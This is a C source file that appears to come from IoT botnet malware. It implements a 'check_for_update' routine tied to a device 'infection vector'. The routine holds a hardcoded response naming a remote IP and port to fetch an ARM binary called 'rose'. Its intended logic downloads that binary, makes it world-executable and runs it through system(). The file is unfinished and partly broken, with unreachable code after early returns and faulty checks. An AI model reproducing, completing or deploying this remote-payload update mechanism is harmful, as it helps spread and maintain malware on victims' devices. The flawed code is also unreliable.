#define _GNU_SOURCE

#include <string.h>
#include <sys/stat.h>
#include "../utils/util.h"
#include "../security/security.h"
#include "../network/network.h"

/**
 * @brief Check for updates
 *
 * @param vector Device infection vector
 */
void check_for_update(char *vector)
{
    char *build = get_build();
    char *url = NULL;

    if (asprintf(&url, "/update?arch=%s", build) == FAILURE)
    {
        return;
    }

    /**
     * Todo:
     * - Fix http client
     * > HttpResponse *response = http_get(url, ServerAddr, ApiPort);
     */
    HttpResponse *response = malloc(sizeof(HttpResponse));
    response->StatusCode = 200;
    response->Content = "0.0.9|http://85.31.44.75:3333/download?arch=ARM6|rose_ARM6";

    if (response == NULL)
    {
        return;
    }

    if (response->StatusCode != 200)
    {
        return;
    }

    /**
     * Todo:
     * - Encrypt response
     * > response->Content = encrypt_str(response->Content);
     */

    printf("Response: %s\n", response->Content);

    return;

    char *version = "";      // split[0];
    char *download_url = ""; // split[1];
    char *filename = "";     // split[2];

    printf("Version: %s\n", version);
    printf("Download URL: %s\n", download_url);
    printf("Filename: %s\n", filename);

    return;

    if (version == NULL || download_url == NULL || filename == NULL)
    {
        return;
    }

    // Version updated.
    if (strcmp(version, BIN_VERSION) == TRUE)
    {
        return;
    }

    // Download new binary.
    /**
     * Todo:
     * - Save binary with random name
     */
    if (download_bin("rose", download_url) == FAILURE)
    {
        return;
    }

    // Set permissions.
    if (chmod("rose", 0777) == FAILURE)
    {
        return;
    }

    char *cmd = NULL;
    if (asprintf(&cmd, "./rose %s", vector) == FAILURE)
    {
        return;
    }

    // Execute new binary.
    if (system(cmd) == FAILURE)
    {
        return;
    }

    exit(EXIT_SUCCESS);
}
